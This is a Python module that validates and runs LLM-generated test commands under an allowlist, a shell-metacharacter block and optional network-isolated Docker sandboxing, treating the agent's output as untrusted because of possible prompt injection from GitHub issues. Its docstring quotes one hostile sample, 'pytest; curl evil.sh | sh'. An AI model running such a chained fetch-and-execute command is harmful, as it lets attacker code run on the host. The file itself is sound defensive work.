"""Shell adapter — run test commands safely inside the project directory.

Security model: the test command originates from an LLM whose context can include
attacker-controlled text (e.g. a GitHub issue body via the webhook). It is treated
as untrusted. Commands are tokenised with shlex, executed with shell=False (no shell
interpretation), the executable must be in an allowlist, and shell metacharacters are
rejected outright. This prevents command chaining / injection such as
`pytest; curl evil.sh | sh`.
"""
from __future__ import annotations

import shlex
import subprocess
from dataclasses import dataclass
from pathlib import Path

# Only these executables are permitted.
_ALLOWED = frozenset({
    "pytest", "python", "python3",
    "npm", "npx", "yarn", "pnpm",
    "go", "cargo",
    "make",
    "jest", "vitest", "mocha",
})

# Characters that enable command chaining, redirection, substitution, or globtrick.
# Their presence anywhere in the raw command string is a hard reject — we never want
# the test command to do anything but run a single test process.
_FORBIDDEN_CHARS = frozenset(";&|`$><\n\r\\")

_DEFAULT_TIMEOUT = 300  # 5 minutes

# Markers indicating a 'green' run that collected no tests — a pass here proves
# nothing about the change.
_VACUOUS_MARKERS = (
    "no tests ran",
    "no tests collected",
    "collected 0 items",
    "0 passed",
    "ran 0 tests",
    "no test files found",
    "found 0 tests",
    "0 total",
)


def output_looks_vacuous(text: str) -> bool:
    """True if test output indicates zero tests were actually collected/run."""
    low = (text or "").lower()
    return any(m in low for m in _VACUOUS_MARKERS)


class UnsafeCommandError(ValueError):
    """Raised when a test command is rejected by the safety policy."""


@dataclass
class TestResult:
    passed: bool
    command: str
    return_code: int
    stdout: str
    stderr: str

    def summary(self) -> str:
        status = "PASSED" if self.passed else "FAILED"
        lines = [f"Command: {self.command}", f"Status:  {status}"]
        if self.stdout.strip():
            lines += ["", "stdout:", self.stdout.strip()[-2000:]]
        if self.stderr.strip():
            lines += ["", "stderr:", self.stderr.strip()[-500:]]
        return "\n".join(lines)


def _validate_and_tokenize(command: str) -> list[str]:
    """
    Validate a command against the safety policy and return its argv tokens.

    Raises UnsafeCommandError if the command contains shell metacharacters or the
    executable is not in the allowlist.
    """
    if not command or not command.strip():
        raise UnsafeCommandError("Empty test command")

    bad = sorted(set(command) & _FORBIDDEN_CHARS)
    if bad:
        raise UnsafeCommandError(
            f"Test command contains forbidden shell metacharacter(s) {bad!r}. "
            "Command chaining, redirection, and substitution are not allowed."
        )

    try:
        tokens = shlex.split(command)
    except ValueError as e:
        raise UnsafeCommandError(f"Could not parse test command: {e}") from None

    if not tokens:
        raise UnsafeCommandError("Empty test command after parsing")

    executable = tokens[0]
    if executable not in _ALLOWED:
        raise UnsafeCommandError(
            f"'{executable}' is not in the allowed command list. "
            f"Allowed: {sorted(_ALLOWED)}"
        )

    return tokens


class ShellAdapter:
    """Run test commands in a controlled subprocess (no shell, allowlisted).

    When sandbox=True, the validated command is executed inside a network-isolated
    Docker container with the project mounted read-write at /work, so generated code
    cannot reach the host filesystem or the network during a test run.
    """

    def __init__(
        self,
        cwd: Path,
        timeout: int = _DEFAULT_TIMEOUT,
        sandbox: bool = False,
        sandbox_image: str = "python:3.12-slim",
    ):
        self.cwd = cwd
        self.timeout = timeout
        self.sandbox = sandbox
        self.sandbox_image = sandbox_image

    def _build_argv(self, tokens: list[str]) -> list[str]:
        """Wrap the validated tokens in a docker invocation when sandboxing."""
        if not self.sandbox:
            return tokens
        return [
            "docker", "run", "--rm",
            "--network", "none",          # no network egress from generated code
            "--cpus", "2", "--memory", "2g",
            "-v", f"{self.cwd}:/work",
            "-w", "/work",
            self.sandbox_image,
            *tokens,
        ]

    def run_tests(self, command: str) -> TestResult:
        """
        Execute a test command safely.

        Raises UnsafeCommandError (a ValueError subclass) if the command violates
        the safety policy — preventing arbitrary command execution.
        """
        tokens = _validate_and_tokenize(command)
        argv = self._build_argv(tokens)

        try:
            proc = subprocess.run(
                argv,
                shell=False,
                cwd=self.cwd,
                capture_output=True,
                text=True,
                timeout=self.timeout,
            )
        except subprocess.TimeoutExpired:
            return TestResult(
                passed=False,
                command=command,
                return_code=-1,
                stdout="",
                stderr=f"Command timed out after {self.timeout}s",
            )
        except FileNotFoundError:
            missing = argv[0]
            hint = (
                " (sandbox enabled but Docker is not installed/available)"
                if self.sandbox and missing == "docker" else ""
            )
            return TestResult(
                passed=False,
                command=command,
                return_code=-1,
                stdout="",
                stderr=f"Executable not found: {missing}{hint}",
            )

        return TestResult(
            passed=proc.returncode == 0,
            command=command,
            return_code=proc.returncode,
            stdout=proc.stdout,
            stderr=proc.stderr,
        )

    def run(self, command: str) -> tuple[bool, str]:
        """Convenience wrapper returning (passed, combined_output)."""
        result = self.run_tests(command)
        return result.passed, result.summary()

    def run_trusted(self, command: str) -> tuple[bool, str]:
        """
        Run an OPERATOR-CONFIGURED command (e.g. a deploy/rollback command from
        the trusted config file). This intentionally allows shell features because
        its source is the operator, at the same trust level as the config itself.

        NEVER pass LLM-generated text here — use run()/run_tests() for that.
        """
        try:
            proc = subprocess.run(
                command,
                shell=True,
                cwd=self.cwd,
                capture_output=True,
                text=True,
                timeout=self.timeout,
            )
        except subprocess.TimeoutExpired:
            return False, f"Command timed out after {self.timeout}s"
        output = (proc.stdout + "\n" + proc.stderr).strip()
        return proc.returncode == 0, output


# Backwards-compatible alias used by the orchestrator pipeline.
ShellRunner = ShellAdapter
